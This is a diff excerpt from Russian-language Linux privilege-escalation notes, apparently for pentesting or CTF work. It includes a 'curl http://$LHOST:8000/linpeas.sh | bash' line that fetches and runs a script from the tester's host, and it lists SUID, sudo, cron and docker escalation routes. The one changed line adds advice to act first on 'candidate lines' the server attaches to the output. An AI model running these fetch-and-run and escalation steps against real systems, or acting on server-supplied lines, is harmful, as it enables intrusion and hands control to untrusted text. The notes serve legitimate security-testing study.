@@ -14,7 +14,7 @@ curl http://$LHOST:8000/linpeas.sh | bash 2>&1 | tee /tmp/linpeas.txt   # http-�
 /opt/tools/linux/pspy64   # на цели: процессы и cron без рута, смотреть 2-3 минуты
 ```
 
-- LinPEAS вывод читать по секциям с красными/жёлтыми пометками, а не целиком простынёй: sudo, SUID, capabilities, writable paths в PATH крона, docker.sock, NFS no_root_squash, старые ядра.
+- LinPEAS вывод читать по секциям с красными/жёлтыми пометками, а не целиком простынёй: sudo, SUID, capabilities, writable paths в PATH крона, docker.sock, NFS no_root_squash, старые ядра. Сервер сам прикладывает к выводу «выжимку энумерации» со строками-кандидатами — отрабатывай её первой, каждую строку закрывая выводом.
 - SUID/sudo бинарь найден → искать его имя в материалах (GTFOBins): запрос — просто имя бинаря (`vim`, `find`, `env`...). Команда из GTFOBins зависит от контекста: sudo и suid — разные секции.
 - Крон с относительным путём или записываемым скриптом: проверить владельца и права `ls -la`, PATH в самом crontab.
 - Группа docker/lxd/disk: самодостаточный рут, команды в материалах по запросу `docker group privilege escalation` / `lxd privilege escalation`.
